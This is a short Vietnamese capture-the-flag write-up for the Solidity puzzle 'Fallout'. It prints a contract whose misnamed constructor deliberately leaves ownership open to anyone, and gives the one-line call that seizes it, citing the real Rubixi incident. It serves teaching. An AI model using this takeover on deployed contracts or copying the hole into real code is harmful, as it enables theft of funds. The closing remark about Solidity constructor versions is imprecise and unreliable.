# Level 2: Fallout
## ★☆☆☆☆
Một challenge nếu để ý kỹ contract thì sẽ rất dễ :>
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

## Solution
**Target**: chiếm quyền owner .  
Nếu để ý kỹ thì ở constructor không trùng tên với contract:
```solidity
  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
  ```
Như vậy, chúng ta chỉ đơn giản là gọi đến constructor mà thôi.
 ```javascript
 contract.Fal1out()
```
Check lại owner 
```javascript
await contract.owner()
```
Một số vấn đề bên lề chút,  Rubixi sau khi đổi tên từ Dynamic Pyramid, bằng một cách nào đó mà các dev đã không rename lại constructor, thế là hacker đã lợi dụng cái đó và chiếm quyền owner =)).
> Note: Từ version 0.6.0 về sau, constructor không cần đặt tên giống với contract nữa mà sẽ mặc định là constructor lun. Như ví dụ sau:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Base contract X
contract X {
    string public name;

    constructor(string memory _name) {
        name = _name;
    }
}
```



